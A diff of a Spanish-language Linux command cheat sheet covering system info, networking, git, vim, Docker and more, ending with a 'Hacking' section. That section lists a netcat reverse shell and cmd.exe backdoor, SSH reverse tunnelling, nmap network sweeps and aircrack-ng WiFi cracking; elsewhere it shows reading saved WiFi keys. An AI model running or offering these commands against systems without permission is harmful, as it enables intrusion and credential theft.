@@ -296,7 +296,7 @@ free -m
 dd bs=4M if=arch.iso of=/dev/sdb status=progress
 ```
 
-#### Ver las conexiones en los sockets de nuestro equipo:
+**Ver las conexiones en los sockets de nuestro equipo:**
 ```
 ss
 ss -l
@@ -304,25 +304,25 @@ ss | grep tcp
 ss -t -a
 ```
 
-#### Para conocer los usuarios logueados en el sistema:
+**Para conocer los usuarios logueados en el sistema:**
 ```
 who
 ```
 
-#### IP local y Wifi:
+**IP local y Wifi:**
 ```
 ifconfig
 ip address
 iwconfig
 ```
 
-#### Muestra la IP pública:
+**Muestra la IP pública:**
 ```
 curl ifconfig.me
 curl https://ipinfo.io/ip
 ```
 
-#### Saber la claves Wi-Fi a la que nos hemos conectado:
+**Saber la claves Wi-Fi a la que nos hemos conectado:**
 ```
 sudo -i
 cd /etc/NetworkManager/system-connections
@@ -330,7 +330,7 @@ ls
 cat "el archivo wifi"
 ```
 
-#### Ruta
+**Ruta**
 [IP ROUTE](https://devconnected.com/how-to-add-route-on-linux/)
 ```
 ip route
@@ -339,24 +339,27 @@ ip route
 route -n
 ```
 
-#### Enviar peticiones a servidores online o en red local:
+**Enviar peticiones a servidores online o en red local:**
 ```
 ping google.com || ping 192.168.1.1
 ```
 
-#### Usuario y tiempo conectado:
+**Usuario y tiempo conectado:**
 ```
 uptime -p
 ```
 
-#### Muestra la versión del kernel:
+**Muestra la versión del kernel:**
 ```
 uname -r
 ```
 
-#### Almacenamiento de los discos `df`
+**Almacenamiento de los discos:**
+```
+df --total -h
+```
 
-#### Si queremos saber donde está un dispositivo USB, disco duro y sus particiones:
+**Si queremos saber donde está un dispositivo USB, disco duro y sus particiones:**
 ```
 fdisk -l
 ```
@@ -364,22 +367,18 @@ fdisk -l
 lsblk
 ```
 
-#### Los procesos del sistema pueden mostrarse con:
+**Los procesos del sistema pueden mostrarse con:**
 ```
 top && htop
 ```
+
+**Imprimir todos los procesos en un momento determinado:**
 ```
 ps -ef | less
 ```
+__El signo | nos permite concatenar comandos (pipes).__
 
-El signo | nos permite concatenar comandos (pipes).
-
-#### Imprimir todos los procesos en un momento determinado:
-```
-ps -ef
-```
-
-#### Detalles del Hardware y bios del sistema:
+**Detalles del Hardware y bios del sistema:**
 ```
 dmidecode
 dmidecode -t processor
@@ -389,12 +388,12 @@ dmidecode -V
 dmidecode --help
 ```
 
-#### Con neofetch podemos ver detalles de nuestro sistema de manera divertida (`apt install neofetch`):
+**Con neofetch podemos ver detalles de nuestro sistema de manera divertida (`apt install neofetch`):**
 ```
 neofetch
 ```
 
-#### Descomprimir archivos:
+**Descomprimir archivos:**
 ```
 unzip *.zip
 ```
@@ -402,12 +401,12 @@ unzip *.zip
 gunzip example.txt.gz
 ```
 
-#### Instalación de aplicaciones .deb. También es posible usar `gdebi`:
+**Instalación de aplicaciones .deb. También es posible usar `gdebi`:**
 ```
 dpkg -i archivo.deb && apt install -f
 ```
 
-#### Los siguientes comandos utilizan systemctl para controlar servicios del sistema:
+**Los siguientes comandos utilizan systemctl para controlar servicios del sistema:**
 ```
 systemctl enable nombre_servicio
 systemctl start nombre_servicio
@@ -415,41 +414,41 @@ systemctl stop nombre_servicio
 systemctl disable nombre_servicio
 ```
 
-#### Reiniciar Wifi:
+**Reiniciar Wifi:**
 ```
 service network-manager restart
 ```
 
-#### ``nohup`` mantiene la ejecución de un comando pese a salir de la terminal por ejemplo, un script de Python:
+**``nohup`` mantiene la ejecución de un comando pese a salir de la terminal por ejemplo, un script de Python:**
 
 ```
 nohup python3 main.py > flask.log 2>&1 &
 ```
 
-#### Detener proceso:
+**Detener proceso:**
 ```
 top
 kill id_proceso
 ```
 
-#### Características del sistema:
+**Características del sistema:**
 ```
-lshw
-```
-```
-lscpu
+lshw && lscpu
 ```
 
-#### Un browser en el terminal:
+**Un browser en el terminal:**
 ```
 elinks https://medium.com/learn-love-code/how-to-set-up-your-professional-data-science-environment-6df74eb06aa4
 ```
 
-#### Ver lista de repositorios:
+**Ver lista de repositorios:**
+```
+apt list
+```
 ```
 vi /etc/apt/sources.list
 ```
-#### Fedora
+**Fedora**
 ```
 dnf repolist
 ```
@@ -457,120 +456,103 @@ dnf repolist
 vi /etc/yum.repos.d/fedora.repo
 ```
 
-#### Controlar los permisos para la accesibilidad de los archivos y carpetas de nuestro sistema, por ejemplo, dar todo tipo de acceso a un archivo:
+**Controlar los permisos para la accesibilidad de los archivos y carpetas de nuestro sistema, por ejemplo, dar todo tipo de acceso a un archivo:**
 ```
 sudo chmod 777 nombre_archivo
 sudo chmod a+rwx nombre_archivo
 ```
 
-#### O para que solamente root pueda acceder a ellos:
+**O para que solamente root pueda acceder a ellos:**
 ```
 sudo chmod 700 nombre_archivo
 ```
 
-#### Acceso a carpeta para todos los usuarios:
+**Acceso a carpeta para todos los usuarios:**
 ```
 chmod ugo+rwx nombre_carpeta
 ```
 
-#### Cambiar el 'owner' de /u y subdirectorios del usuario "root". Útil para acceder a archivos "READ-ONLY":
+**Cambiar el 'owner' de /u y subdirectorios del usuario "root". Útil para acceder a archivos "READ-ONLY":**
 ```
 sudo chown -hR root /u
 ```
 
-#### Encontrar palabras con `grep` o `egrep` (usa expresiones regulares extensivas - obsoleto, utilizar `grep -E`):
+**Encontrar palabras con `grep` o `egrep` (usa expresiones regulares extensivas - obsoleto, utilizar `grep -E`):**
 ```
 touch example
 ls | egrep example
 ```
 
-#### Buscar palabras en archivo:
+**Buscar palabras en archivo:**
 `look texto archivo` o `grep texto archivo`
 
-#### Encontrar después de patrón:
+**Encontrar después de patrón:**
 ```
 echo "field1 field2 field3 field4" | grep -oP '(?<=field3 )[^ ]*'
 ```
 
-#### Antes del patrón:
+**Antes del patrón:**
 ```
 echo "field1 field2 field3 field4" | grep -oP '(?<=field2 )\w+'
 ```
 
 ## Información de la red
-#### IP del proveedor de Internet:
+**IP del proveedor de Internet:**
 ```
 grep nameserver  /etc/resolv.conf | awk '{print $2}'
 ```
 
-#### IP del servidor local:
+**IP del servidor local:**
 ```
 ip route show | grep default | awk '{print $3}' | cut -d$'\n' -f1
 ```
 
-#### IP local del dispositivo:
+**IP local del dispositivo:**
 ```
 ip address show $interface | grep "inet " | awk '{print $2}'
 ```
 
 ## Manejo de archivos y Data Mining
-Para listar los archivos que tengan un patrón, por ejemplo, que terminen en .iso. 
+**Para listar los archivos que tengan un patrón, por ejemplo, que terminen en .iso.**
 ```
 ls | grep *.iso
 ```
 
-Para saber el número de archivos en una carpeta:
+**Para saber el número de archivos en una carpeta:**
 ```
 ls | wc -l
 ```
 
-Conocer la cantidad de filas en un archivo:
-
+**Conocer la cantidad de filas en un archivo:**
 ```
 wc -l archivo
 ```
 
-Para acceder a las 10 primeras y últimas filas:
+**Para acceder a las 10 primeras y últimas filas:**
 ```
 head -10 archivo
 tail -10 archivo
 ```
 
-Si el archivo es demasiado grande, podemos separarlo en varias partes, por ejemplo, cinco:
-
+**Si el archivo es demasiado grande, podemos separarlo en varias partes, por ejemplo, cinco:**
 ```
-split -n 5 archivo x
+split -n 5 archivo parte_
 ```
 ```
 split -a 3 -d -b 10M archivo.txt logs_
 ```
 
-Para volver a unirlos:
+**Para volver a unirlos:**
 ```
-cat xa* > log.txt
-```
-
-Para seleccionar la quinta columna, utilizamos:
-```
-awk '{print $5}' archivo
+cat logs_* > log.txt
 ```
 
-Separar columnas en función de un carácter, por ejemplo, dos puntos ( : )
+**Para seleccionar la quinta columna, utilizamos:**
 ```
-cut -d ':' -f1 archivo
-```
-
-Obtener la primera fila de datos (crear un respaldo):
-```
-sed 1d archivo
+awk '{print $5}' log
 ```
 
-Eliminar la última línea o fila de datos:
-```
-sed -i '$d' archivo
-```
-
-Cambiar el orden de columnas:
+**Cambiar el orden de columnas:**
 ```
 awk '{print $3, $1}' archivo.txt
 ```
@@ -578,19 +560,36 @@ awk '{print $3, $1}' archivo.txt
 ps -ef | awk -F " " '{print $2}'
 ```
 
-Cortar una sección intermedia de filas:
+**Separar columnas en función de un carácter, por ejemplo, dos puntos ( : )**
 ```
-sed -n '250, 260p' archivo1.txt > archivo2.txt
+cut -d ':' -f 1 log
 ```
 
-Crear un secuencia:
+**Obtener la primera fila de datos (crear un respaldo):**
+```
+sed 1d archivo
+```
+
+**sed -i edita el archivo original**
+
+**Eliminar la última línea o fila de datos:**
+```
+sed -i '$d' archivo
+```
+
+**Cortar una sección intermedia de filas:**
+```
+sed -n '2, 6p' archivo1.txt > archivo2.txt
+```
+
+**Crear un secuencia:**
 ```
 seq 1 10
 ```
 
-Para buscar archivos:
+**Para buscar archivos:**
 ```
-sudo apt-get install mlocate
+sudo apt install locate
 ```
 ```
 sudo updatedb
@@ -599,16 +598,15 @@ sudo updatedb
 locate -i archivo
 ```
 
-Localizar un comando:
+**Localizar un comando:**
 ```
 which python
 ```
 
 ## Programas importantes
-
 ### SSH
 
-Instalar:
+**Instalar:**
 ```
 sudo apt install openssh-server -y
 sudo systemctl enable ssh
@@ -616,51 +614,44 @@ sudo systemctl start ssh
 sudo systemclt status ssh
 ```
 
-Agregar llaves para no usar contraseñas:
+**Agregar llaves para no usar contraseñas:**
 ```
 ssh-keygen
 ssh-copy-id -i ~/.ssh/id_rsa.pub UserName@RemoteServer
 ssh-add
 ```
-Sí hay una ``ssh key`` requerida:
-
+**Sí hay una ``ssh key`` requerida:**
 ```
 ssh -i tu_ssh_key.pem user@server_ip
 ```
 
-Copiar archivos local --> remoto:
-
+**Copiar archivos local --> remoto:**
 ```
 scp /dir/al/archivo user@remote.local:~/Destino/
 scp -P 22 -r /dir/ user@remote:~/Destino/
 ```
 
-Copiar archivos remoto --> local:
-
+**Copiar archivos remoto --> local:**
 ```
 scp user@ip:file.txt /path/to/dest
 ```
 
-Y copiar archivos con llave:
-
+**Y copiar archivos con llave:**
 ```
 scp -r -i tu_ssh_key.pem tu_archivo user@server_ip:~
 ```
 
-Para ejecutar comandos a distancia:
-
+**Para ejecutar comandos a distancia:**
 ```
 ssh user@remote.local ls
 ```
 
-Para conectar fuera de la red local necesitamos la IP pública del router y haber abierto un túnel para un servidor local:
-
+**Para conectar fuera de la red local necesitamos la IP pública del router y haber abierto un túnel para un servidor local:**
 ```
 ssh user@IP
 ```
 
-Firewall:
-
+**Firewall:**
 ```
 ufw allow 22/tcp
 ufw allow 2222/tcp
@@ -669,54 +660,46 @@ ufw limit ssh
 ufw status
 ```
 
-Detener y deshabilitar:
-
+**Detener y deshabilitar:**
 ```
 systemctl stop ssh
 systemclt disable ssh
 ```
 
 ### Wget
-
-Descargar archivos desde la terminal, por ejemplo, instalador de RStudio para Debian 10 y Ubuntu 19. 
+**Descargar archivos desde la terminal, por ejemplo, instalador de RStudio para Debian 10 y Ubuntu 19.** 
 
 ```
 wget https://download1.rstudio.org/desktop/bionic/amd64/rstudio-1.2.5001-amd64.deb
 ```
 
-Para descargar archivos de un servidor o website.
-
+**Para descargar archivos de un servidor o website.**
 ```
 wget -A pdf,csv,txt,png,jpg -m -p -E -k -K -np www.programandoconro.wordpress.com
 ```
 
-Descargar el index.html y los links asociados al website.
-
+**Descargar el index.html y los links asociados al website.**
 ```
 wget -rpk www.programandoconro.wordpress.com
 ```
 
 ### Git
-
-Para descargar un repositorios Git:
-
+**Para descargar un repositorios Git:**
 ```
 git clone https://github.com/progamandoconro/My-Lynux-Locker
 ```
 
-Para actualizar el repositorio local a partir de GitHub:
-
+**Para actualizar el repositorio local a partir de GitHub:**
 ```
 git pull origin master
 ```
 
-Los commits y los push también pueden realizarse de esta manera o directamente en GitHub. 
-
+**Los commits y los push también pueden realizarse de esta manera o directamente en GitHub.**
 ```
 git add . # Agregar todos los archivos
 ```
 
-Agregar un archivo concreto:
+**Agregar un archivo concreto:**
 ```
 git add /path/to/file
 ```
@@ -724,110 +707,102 @@ git add /path/to/file
 git diff --cached
 git commit -m 'comment'
 git commit --amend -m 'my corrected comment' # Para corregir el mensaje del commit anterior.
-```
-```
 git push -u origin master
 git checkout -b 'robranch'
 git switch robranch # Cambiar de branch
-```
-```
 git push origin robranch
 git branch -a # Ver las branchs
 ```
-Une otra branch con la branch en la te encuentras
+
+**Une otra branch con la branch en la te encuentras**
 ```
 git merge <otra-branch>
 git merge --squash <otra-branch> # Igual que el anterior pero junta todo los commits(es necesario hacer un nuevo `git add .` y `git commit -m "mensaje"`)
 git fetch --all # Actualizar las branchs
 ```
-Elimina el archivo en todo el historial
+
+**Elimina el archivo en todo el historial**
 ```
 git rm --cached myarchivo.txt
 ```
-Actualiza las branchs remotas localmente
+
+**Actualiza las branchs remotas localmente**
 ```
 git remote update origin --prune
 ```
-Para hacer stash ("salvar los cambios" sin commit) y agregar un mensaje a dicho stash:
+
+**Para hacer stash ("salvar los cambios" sin commit) y agregar un mensaje a dicho stash:**
 ```
 git stash save "mensaje"
 ```
 
-Más opciones y comandos de git:
+**Más opciones y comandos de git:**
 ```
 git init
 ```
-Para saber el nombre e email configurados en git:
+
+**Para saber el nombre e email configurados en git:**
 ```
 git config --global user.name "Your Name Comes Here"
 git config --global user.email you@yourdomain.example.com
 git config --list
-```
-```
 git status
-```
-```
 git log
 git log -p
 git log -S # searchs a word in the commits
 git log --stat --summary
 git log --graph --decorate --oneline
-```
-```
 git help -a
 git help -g
 ```
 
-Revertir commit:
-
+**Revertir commit:**
 ```
 git log --oneline # Para obtener la id del commit al que desear regresar.
 git checkout <commit-id>
 git add . && git commit "Go back" && git push origin <branch>
 ```
 
-Volver al commit anterior sin guardar cambios agregados:
-
+**Volver al commit anterior sin guardar cambios agregados:**
 ```
 git reset --soft HEAD
 ```
 
-Volver a un commit puntual.
-Busca el commit id con `git log` seguido de:
-
+**Volver a un commit puntual.**
+**Busca el commit id con `git log` seguido de:**
 ```
 git reset <commit-id>
 ```
 
-En caso que no hayas hecho `git add .`, puedes usar el siguiente comando para volver al commit previo y eliminar los cambios:
+**En caso que no hayas hecho `git add .`, puedes usar el siguiente comando para volver al commit previo y eliminar los cambios:**
 
-Bueno cuando los experimentos no salieron bien y quieres volver al commit anterior:
+**Bueno cuando los experimentos no salieron bien y quieres volver al commit anterior:**
 ```
 git checkout .
 ```
 
-** Podemos usar HEAD~2 para volver dos commit a tras de HEAD.
+**Podemos usar HEAD~2 para volver dos commit a tras de HEAD.**
 
-Usando `git reset --hard` seguido del hash del commit, volvemos a dicho commit.
+**Usando `git reset --hard` seguido del hash del commit, volvemos a dicho commit.**
 
-Extra tips:
+**Extra tips:**
 
-* Si creas un archivo ``.gitignore`` en el directorio, git ignora los archivos que determines.
+*Si creas un archivo ``.gitignore`` en el directorio, git ignora los archivos que determines.
 
-* Puedes crear ``alias`` por ejemplo, para agregar los archivo en el directorio actual y hacer un commit al mismo tiempo:
+**Puedes crear ``alias`` por ejemplo, para agregar los archivo en el directorio actual y hacer un commit al mismo tiempo:**
 
 ```
 git config --global alias.ac '!git add . && git commit -m'
 ```
 
-* Buscar archivos que contengan una palabra específica en el código dentro de todo el repositorio con ``git grep 'palabra(s)'``
+**Buscar archivos que contengan una palabra específica en el código dentro de todo el repositorio con ``git grep 'palabra(s)'``**
 
-* Guardar el estado actual del repositorio sin hacer commit con ``git stash``. Usando ``git stash pop`` volvemos al estado en el que estábamos trabajando.
+**Guardar el estado actual del repositorio sin hacer commit con ``git stash``. Usando ``git stash pop`` volvemos al estado en el que estábamos trabajando.**
 
-* Tutorial de git
-  ``git help tutorial``
+**Tutorial de git**
+``git help tutorial``
 
-### Tmux:
+## Tmux:
 
 Install: ``apt install tmux``
 
@@ -864,11 +839,13 @@ Detach from session: ``Ctrl b`` + d
 
 Switch sessions: ``Ctrl b`` + s
 
+Kill active panel: ``Ctrl b`` + x
+
 To check session: ``tmux ls``
 
 To attach to a session: ``tmux attach -t mysession``
 
-To kill a session, simply use: ``exit``
+To kill a session, simply use: ``exit`` o ``tmux kill-server``
 
 Extra ones:
 
@@ -876,9 +853,9 @@ Big clock: ``Ctrl b`` + ``t``
 
 Shortcuts: ``Ctrl b`` + ``?``
 
-### Vim:
+## Vim:
 
-Básicos:
+**Básicos:**
 
 ``i``  Modo insertar (insertar texto).
 
@@ -916,7 +893,7 @@ Básicos:
 
 ``I``  insertar al principio de la línea.
 
-__Desplazamiento:__
+**Desplazamiento:**
 
 ``e``  final de palabra.
 
@@ -948,13 +925,13 @@ __Desplazamiento:__
 
 Funciona para otros caracteres, por ejemplo: ``[ , ( , [a-z], [0-9] ,``, etc.
 
-__Selección:__
+**Selección:**
 
 ``v``  seleccionar (usar cursor o letras para mover, sirve combiando con Shift).
 
 ``V``  seleccionar línea entera.
 
-``:V G``  selecciona todo el texto abajo del cursor.
+``V G``  selecciona todo el texto abajo del cursor.
 
 `V }` Seleccionar una función
 
@@ -964,7 +941,7 @@ __Selección:__
 
 `vat` Seleccionar html tag hacia abajo o arriba
 
-__Funcionalidades:__
+**Funcionalidades:**
 
 Mostrar archivos en path  ``:!ls``
 
@@ -986,13 +963,13 @@ Ir al final ``G``
 
 Mostrar status ``Ctrl + g``
 
-__Ergonómicos:__
+**Ergonómicos:**
 
-Salir  ``Z Q``
+``Z Q`` Salir.
 
 ``Ctrl c`` Modo Normal.
 
-``:V G d``  borrar todo el documento
+``V G d``  borrar todo el documento
 
 Borrar y editar directamente dentro de una función  ``c i {``
 
@@ -1002,11 +979,11 @@ Borrar y editar directamente dentro de una función  ``c i {``
 
 ``.`` Rehace el último comando en un sito nuevo.
 
-__Marcas:__
+**Marcas:**
 
 Escribe ``:mark a`` en la línea que desea marcar, navega a ella con ``'a``. También puedes navegar entre marcas con ``['`` y ``]'``.
 
-__Editar múltiples líneas:__
+**Editar múltiples líneas:**
 
 Seleccionamos con ``V`` y luego usamos ``Ctrl V`` seguido de las teclas de desplazamiento (j, k, l, h, etc...) y el texto a agregar.
 
@@ -1016,11 +993,11 @@ seleccionamos con `V` y agregamos `I`, luego con espacios movemos las líneas.
 
 Sustituir patrón de texto ``:%s 'texto a sustituir'/'nuevo texto'``.
 
-__Comentar múltiples líneas:__
+**Comentar múltiples líneas:**
 
 Comentar. Seleccionar texto a comentar y luego ``:norm i// (o :norm i#)``. O, puedes utilizar ``:s/^/# /`` .
 
-__Autoindent múltiples líneas (Ideal para programar en Python):__
+**Autoindent múltiples líneas (Ideal para programar en Python):**
 
 Seleccionar líneas con ``V`` y luego ``>>``.
 
@@ -1028,13 +1005,13 @@ Autocompletar <- ``Ctrl x Ctrl o``, luego seleccionar con ``Ctrl n`` .
 
 Prettier para js, html, css ``Ctrl l``.
 
-__Editar varias líneas al mismo tiempo:__
+**Editar varias líneas al mismo tiempo:**
 
-__Encerrar texto seleccionado en un tab__
+**Encerrar texto seleccionado en un tab**
 
 selecciona con v o V, luego ``S`` y finalmente el tag, por ejemplo, ```<div>```
 
-__Editar varios archivos en la misma pantalla__
+**Editar varios archivos en la misma pantalla**
 
 Editar un nuevo archivo: ``:e nombre_archivo``
 
@@ -1046,7 +1023,7 @@ Navegar entre pantallas: ``Ctrl w + jklh``
 
 Con ``:hide`` podemos esconder la ventana, o simplemente ``:q``, ``:qa!`` o ``:wq`` para cerrarla.
 
-__Abrir la terminal sin salir de Vim:__
+**Abrir la terminal sin salir de Vim:**
 
 Podemos usar ``:term`` o ``:vert term`` para que se divida la pantalla verticalmente.
 
@@ -1057,15 +1034,13 @@ Encapsular un ``tag``  con otro ``tag`` facilmente. Útil para react, react-nati
 
 Selecciona el tag a encapsular con ``v``, luego utiliza ``S`` y escribe el tag que va a encapsular al anterior, por ejemplo ``View`` o ``div``.  
 
-### Docker (o Podman)
-
+## Docker (o Podman)
 ```
 docker run -it ubuntu 
 docker images
 ```
 
-Dockerfile:
-
+**Dockerfile:**
 ```
 FROM
 MAINTAINER
@@ -1090,20 +1065,17 @@ docker image prune -a # borra las imágenes no utilizadas
 docker system prune # elimina el cache, los containers e imágenes detenidas, etc.
 ```
 
-Para acceder a los puertos del localhost desde el contenedor:
-
+**Para acceder a los puertos del localhost desde el contenedor:**
 ```
 docker run -it --network host example  
 ```
 
-Para limitar el uso de memoria RAM y de CPU:
-
+**Para limitar el uso de memoria RAM y de CPU:**
 ```
 docker run -dit --memory="1g" --cpus="1.0" nombre_contenedor
 ```
 
-Uso de ``docker-compose``:
-
+**Uso de ``docker-compose``:**
 ```
 docker-compose build
 docker-compose up
@@ -1112,16 +1084,14 @@ docker-compose stop
 ```
 
 ### Tor
-
 Para navegar de manera anónima.  Simplemente descargalo de https://www.torproject.org y:
 
 ```
- tar -xvJf tor-browser-linux64-9.0.4_en-US.tar.xz
- ./tor-browser_en-US/Browser/start-tor-browser &
+tar -xvJf tor-browser-linux64-9.0.4_en-US.tar.xz
+./tor-browser_en-US/Browser/start-tor-browser &
 ```
 
 ### Anaconda
-
 ```
 conda create -n my_env python=3.7 anaconda
 conda create -n r_env r-essentials r-base
@@ -1137,7 +1107,6 @@ conda install face_recognition # (o pip install face_recognition)
 ```
 
 ### Descargar videos
-
 ```
 youtube-dl $url
 # solamente audio
@@ -1147,33 +1116,29 @@ youtube-dl -F $url
 ```
 
 ### Cambiar formato .avi a .mp4
-
 ```
 ffmpeg -i input.avi -strict -2 output.mp4
 ```
 
-#### Crear gifs animados (ImageMagick):
-
+### Crear gifs animados (ImageMagick):
 ```
 convert -delay 10 -loop 0 * .png mygif.gif
 ```
 
-#### Ver fotos en la terminal:
+### Ver fotos en la terminal:
 ```
 apt install fbi
 fbi foto.png
 ```
 
-#### VLC para controlar la música desde la línea de comandos:
-
+### VLC para controlar la música desde la línea de comandos:
 ```
 cvlc /music
 # para ver opciones de control:
 vlc --help
 ```
 
-#### Juegos en Terminal:
-
+### Juegos en Terminal:
 ```
 apt-get install bastet moon-buggy ninvaders nsnake pacman4console neofetch figlet -y
 ```
@@ -1183,12 +1148,10 @@ moon-buggy
 figlet HOLA AMIGO
 ```
 
-El próximo comando te hará sentir en la matrix.
-
+**El próximo comando te hará sentir en la matrix.**
 ```
 apt install cmatrix
 ```
-
 ```
 cmatrix
 telnet towel.blinkenlights.nl
@@ -1204,19 +1167,16 @@ Provocar sonidos en el computador (apt install beep / yum install beep) ``beep -
 
 También se puede hacer un banner, sencillamente: ``banner hola``
 
-Instalar nuevos themes e íconos
-
+**Instalar nuevos themes e íconos**
 ```
 apt search shell-theme # o dnf en Fedora
 apt search icon-theme
-
 apt install ... # dnf install ...
 ```
 
 ## COMANDOS NIVEL INTERMEDIO
 
-Buscar paquetes que contienen algun comando que requerimos
-
+**Buscar paquetes que contienen algún comando que requerimos:**
 ```
 # Debian / Ubuntu
 apt search paquete
@@ -1228,8 +1188,7 @@ yum search paquete
 pacman -Ss paquete
 ```
 
-Para ejecutar scripts al iniciar el sistema
-
+**Para ejecutar scripts al iniciar el sistema:**
 ```
 cd ~
 sudo nano .bashrc
@@ -1239,66 +1198,56 @@ sudo nano .bashrc
 
 Para seguir ejecutando un comando incluso despues de cerrar la sesión en tu servidor. Usa ``ssh``para entrar en tu servidor. Luego ejecuta ``screen``, esto creará una nueva pantalla, ejecuta el comando que deseas que siga corriendo después de desloguearte y finalmente ``Ctrl`` + ad. El comando seguirá corriendo.
 
-Listar las aplicaciones desktop
-
+**Listar las aplicaciones desktop.**
 ```
-ls /usr/share/applications | awk -F '.desktop' ' { print $1}' -
+ls /usr/share/applications | awk -F '.desktop' ' {print $1}'
 ```
 
-Tiempo de procesos
-
+**Tiempo de procesos:**
 ```
 echo "sudo apt update -y" > myUpdate.sh
 time bash myUpdate.sh
 ```
 
- Esperar 10 segundos.
-
+**Esperar 10 segundos.**
 ```
 sleep 10
 ```
 
-Asignar nombre a variable introducida por el usuario:
-
+**Asignar nombre a variable introducida por el usuario:**
 ```
 read -p "Enter a word: " word
 echo "You entered $word"
 ```
 
-Programar tareas
-
+**Programar tareas:**
 ```
 rm -f /var/run/crond.pid #delete pid
 cron 00 00 * * * myUpdate.sh #todos los dias a las 12
 ```
 
-Cambiar el tamaño de las fuente en terminal.
-
+**Cambiar el tamaño de las fuente en terminal.**
 ```
 dpkg-reconfigure console-setup
 ```
 
-Kill procesos en un socket determinado
-
+**Kill procesos en un socket determinado:**
 ```
 sudo lsof -t -i tcp:8000 | xargs kill -9
 ```
 
-Asignar "alias" a comandos, por ejemplo:
-
+**Asignar "alias" a comandos, por ejemplo:**
 ```
 alias python=python3
 ```
 
-Para que estos cambios sean permanentes, puedes agreagar un ``alias`` en el archivo ``bashrc``:
-
+**Para que estos cambios sean permanentes, puedes agreagar un ``alias`` en el archivo ``bashrc``:**
 ```
 echo "alias python='python3.9'" >> ~/.bashrc
 source ~/.bashrc
 ```
 
-Crear tu propio comando:
-
+**Crear tu propio comando:**
 ```
 echo "echo MI PROPIO COMANDO" > micomando
 chmod +x micomando
@@ -1307,22 +1256,19 @@ sudo mv micomando /usr/bin/
 micomando
 ```
 
-Formatear USB:
-
+**Formatear USB:**
 ```
 fdisk -l # encontramos el dispositivo, por ejemplo sdc1.
 umount /dev/sdc1
 sudo mkfs -t vfat /dev/sdc1
 ```
 
-Controlar luz de la pantalla (Debes encontrar el archivo ``brightness``):
-
+**Controlar luz de la pantalla (Debes encontrar el archivo ``brightness``):**
 ```
 echo 8 > /sys/class/backlight/intel_backlight/brightness
 ```
 
-Escribir un script de varias líneas en la terminal sin usar un editor.
-
+**Escribir un script de varias líneas en la terminal sin usar un editor.**
 ```
 cat <<EOF > print.sh
 #!/bin/bash
@@ -1330,97 +1276,68 @@ echo esta es una línea
 echo esta es otra línea
 EOF
 ```
-
 ``sh print.sh``
 
-Ejecutar un script cada vez que iniciemos una sesión, por ejemplo, un programa ``python``:
-
-``sudo vim /etc/profile`` y agregamos al final ``sudo python /carpeta/con/el/programa/nombreprograma.py &``
+**Ejecutar un script cada vez que iniciemos una sesión, por ejemplo, un programa ``python``:**
+```
+sudo vim /etc/profile`` y agregamos al final ``sudo python /carpeta/con/el/programa/nombreprograma.py &
+```
 
 ## Hacking:
-
 ### Nmap
-
 ```
 apt install nmap
 ```
 
+**Para evaluar la red local entera:**
 ```
-nmap localhost
-```
-
-# Para evaluar la red local entera:
 nmap 192.168.1.1/24 #(o 192.168.0.1/24)
-
-#filtrar por puerto y estado
-nmap -Pn 192.168.1.1/24 -p22 -open  
-
-# Auditar
-nmap -Pn **PublicIP**/24
 ```
 
-### SSH
-
-Conectar
-
+**filtrar por puerto y estado**
 ```
-ssh usuario@servidor.local
-```
-```
-ssh usuario@IP
+nmap -Pn 192.168.1.1/24 -p22 -open
 ```
 
-Conectar SSH sin password
+**Auditar**
 ```
-ssh-keygen
-ssh-copy-id -i ~/.ssh/id_rsa.pub usuario@servidor.local
-```
-
-Compartir archivos
-
-```
-scp nombrearchivo mi@servidor.local:~
+nmap -Pn PublicIP/24
 ```
 
-Bloquear IPs que intenten conectar sin permiso
-
+**Bloquear IPs que intenten conectar sin permiso.**
 ```
 iptables -A INPUT -s $IP -j DROP
 ```
 
- Elegir en cual servidor mostrar el display.
-
+**Elegir en cual servidor mostrar el display.**
 ```
 export DISPLAY=:0 # en el servidor local
 export DISPLAY=:1 # en el servidor remoto
 ```
 
- Reverse shell tunneling:
-
- El cliente con Firewall se conecta a la computadora del desarrollador (dev), y envía su shell de manera reversa (``-R--``), creando un túnel.
+**Reverse shell tunneling:**
+El cliente con Firewall se conecta a la computadora del desarrollador (dev), y envía su shell de manera reversa (``-R--``), creando un túnel.
 
 ```
 ssh -R 19999:localhost:22 dev@publicIP
 ```
 
- El desarrollador escucha en el puerto 19999 y accede a la computadora del cliente (cli), gracias al túnel abierto.
+El desarrollador escucha en el puerto 19999 y accede a la computadora del cliente (cli), gracias al túnel abierto.
 
- ``ssh cli@localhost -p 19999``
+``ssh cli@localhost -p 19999``
 
- Redirigir un puerto (ej. 80) de una computadora remota al localhost (ej. 2002):
+Redirigir un puerto (ej. 80) de una computadora remota al localhost (ej. 2002):
 
- ``ssh -N -L2002:localhost:80 user@ip_machine``
+``ssh -N -L2002:localhost:80 user@ip_machine``
 
-### Compartir la terminal en el browser
-
+**Compartir la terminal en el browser.**
 (``apt install tmate`` / ``yum install tmate``)
 
 ```
 tmate
 ```
 
-### Modo Monitor de Wifi, Sniffing y Crackeo con aircrack-ng (``apt install aircrack-ng``)
-
+**Modo Monitor de Wifi, Sniffing y Crackeo con aircrack-ng (``apt install aircrack-ng``)**
 ```
 ifconfig wlan1 down
 iwconfig wlan1 mode monitor
@@ -1430,51 +1347,41 @@ airodump-ng -c 1 --bssid XX:XX:XX:XX:XX:XX:XX -w output wlan1
 aircrack-ng -b 00:14:6C:7E:40:80 output.cap -w mydiccionary.txt
 ```
 
-Escaneo de Redes Wifi Disponibles
-
+**Escaneo de Redes Wifi Disponibles**
 ```
 sudo iwlist wlan0 scan | egrep "Cell|ESSID|Signal|Rates"
 ```
 
-### Ncat:
-
+**Ncat:**
 Reverse Shell:
-
 Desarrollador escucha en puerto 4444
-
 ```
- nc -lvp 4444
+nc -lvp 4444
 ```
 
-Cliente envía su Shell a la IP del desarrollador
-
+**Cliente envía su Shell a la IP del desarrollador.**
 ```
 nc **IP** 4444 -e /bin/sh
 ```
 
-Backdoor
-
+**Backdoor**
 Ejecutar en el servidor remoto
-
 ```
 nc -L -p 3001 -d -e cmd.exe
 ```
 
-Servidor web inseguro
-
+**Servidor web inseguro**
 ```
 while : ; do ( echo -ne "HTTP/1.1 200 OK\r\n" ; cat index.html; ) | nc -l -p 8080 ; done
 ```
 
-Chat
-
+**Chat**
 ```
 nc -l -vv -p 5000
 nc 192.168.56.1 5000
 ```
 
-Enviar archivo (inseguro)
-
+**Enviar archivo (inseguro)**
 ```
 Receptor escucha:
 nc -l -p 9999 > test.txt
@@ -1483,135 +1390,78 @@ El otro lado envía:
 nc 192.168.0.1 9999 < test.txt
 ```
 
